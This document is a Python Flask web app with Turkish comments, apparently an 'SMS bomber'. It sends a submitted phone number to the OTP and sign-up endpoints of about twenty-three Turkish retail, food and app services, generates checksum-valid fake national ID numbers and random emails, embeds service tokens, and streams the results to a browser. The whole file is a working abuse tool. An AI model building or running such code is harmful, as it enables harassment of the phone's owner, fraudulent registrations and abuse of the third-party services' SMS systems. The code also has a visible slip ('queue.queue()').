from flask import Flask, render_template, request, Response, jsonify
import threading
import requests
import queue
import uuid
import time
import json
from random import choice, randint
from string import ascii_lowercase

app = Flask(__name__)

# Aktif görevleri ve log kuyruklarını saklamak için sözlük
tasks = {}

class WebSendSms:
    def __init__(self, phone):
        self.phone = str(phone)
        # Random TC kimlik üretimi
        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam)) % 10)
        self.tc = "".join(map(str, rakam))
        self.mail = ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    # --- API SERVİSLERİ ---
    def KahveDunyasi(self):
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json"}
            r = requests.post(url, headers=headers, json={"countryCode": "90", "phoneNumber": self.phone}, timeout=5)
            if r.json().get("processStatus") == "Success": return True
        except: pass
        return False
        
    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=5)
            if r.status_code == 202: return True
        except: pass
        return False
    
    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp", json={"Phone": self.phone, "XID": ""}, timeout=5)
            if r.json().get("isError") == False: return True
        except: pass
        return False
          
    def Suiste(self):
        try:
            r = requests.post("https://suiste.com:443/api/auth/code", data={"action": "register", "gsm": self.phone, "full_name": "Memati Bas", "password": "31MeMaTi31"}, timeout=5)
            if r.json().get("code") == "common.success": return True
        except: pass
        return False
                
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
            
    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/", data={"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "confirm": "true", "sms_allowed": "true"}, timeout=5)      
            if r.status_code == 202: return True
        except: pass
        return False 

    def Ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com:443/api/users/register", json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=5)
            if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!": return True
        except: pass
        return False

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            json_data = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, json=json_data, timeout=5)
            if r.json().get("data", {}).get("generateOtp") == True: return True
        except: pass
        return False

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com:443/users/register/", data={"first_name": "Memati", "last_name": "Bas", "email": self.mail, "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true", "sms_allowed": "true"}, timeout=5)
            if r.status_code == 202: return True
        except: pass
        return False

    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=5)
            if r.json().get("is_success") == True: return True
        except: pass
        return False

    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP", json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=5)
            if r.json().get("status") == "success": return True
        except: pass
        return False

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=5)
            if r.json().get("responseType") == "SUCCESS": return True
        except: pass
        return False
            
    def Akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", headers={"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}, json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == "SMS sended succesfully!": return True
        except: pass
        return False
        
    def Akbati(self):
        try:
            r = requests.post("https://akbatiapi.poilabs.com:443/v1/en/sms", headers={"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}, json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == "SMS sended succesfully!": return True
        except: pass
        return False

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder", headers={"Firmaid": "32"}, json={"FirmaId": 32, "Telefon": self.phone}, timeout=5)
            if r.json().get("Success") == True: return True
        except: pass
        return False
    
    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech:443/api.php?", json={"job": "start_login", "phone": self.phone}, timeout=5)
            if r.json().get("status") == "success": return True
        except: pass
        return False
    
    def Tasdelen(self):
        try:
            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == True: return True
        except: pass
        return False

    def Uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms", json={"phone_number": self.phone}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
    
    def Yapp(self):
        try:
            r = requests.post("https://yapp.com.tr:443/api/mobile/v1/register", json={"app_version": "1.1.5", "phone_number": self.phone, "firstname": "Memati", "lastname": "Bas", "email": self.mail}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
    
    def YilmazTicaret(self):
        try:
            r = requests.post("https://app.buyursungelsin.com:443/api/customer/form/checkx", data={"fonksiyon": "customer/form/checkx", "method": "POST", "telephone": f"0{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

def run_sms_task(task_id, phone):
    worker = WebSendSms(phone)
    # Sınıftaki tüm api metodlarını dinamik olarak listele
    api_methods = [func for func in dir(WebSendSms) if callable(getattr(WebSendSms, func)) and not func.startswith("__") and func not in ["log_usage"]]
    
    q = tasks[task_id]
    
    for method_name in api_methods:
        func = getattr(worker, method_name)
        status = func()
        
        if status:
            msg = f"Başarılı! {phone} --> {method_name.lower()}"
            q.put({"status": "success", "msg": msg})
        else:
            msg = f"Başarısız! {phone} --> {method_name.lower()}"
            q.put({"status": "fail", "msg": msg})
            
        time.sleep(0.5) # API'ler arası hafif nefes aldırma beklemesi
        
    # İş bittiğinde tarayıcıya durması gerektiğini bildir
    q.put({"status": "done"})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_api():
    data = request.get_json() or {}
    phone = data.get("phone")
    if not phone or len(phone) != 10:
        return jsonify({"error": "Geçersiz telefon numarası!"}), 400
        
    task_id = str(uuid.uuid4())
    tasks[task_id] = queue.queue()
    
    # Arka plan iş parçacığını tetikle (Kullanıcıyı webde bekletmemek için asenkron)
    t = threading.Thread(target=run_sms_task, args=(task_id, phone))
    t.daemon = True
    t.start()
    
    return jsonify({"task_id": task_id})

@app.route('/api/stream/<task_id>')
def stream_api(task_id):
    if task_id not in tasks:
        return "Görev Bulunamadı", 404
        
    def event_stream():
        q = tasks[task_id]
        while True:
            try:
                # Kuyruktan veri bekle (Timeout vererek kilitlenmeyi önle)
                data = q.get(timeout=30)
                yield f"data: {json.dumps(data)}\n\n"
                if data.get("status") == "done":
                    # İş bitti, hafızayı temizle ve döngüden çık
                    del tasks[task_id]
                    break
            except queue.Empty:
                # Belirli bir süre veri gelmezse bağlantıyı diri tutmak için ping at
                yield f"data: {json.dumps({'status': 'ping'})}\n\n"
                
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
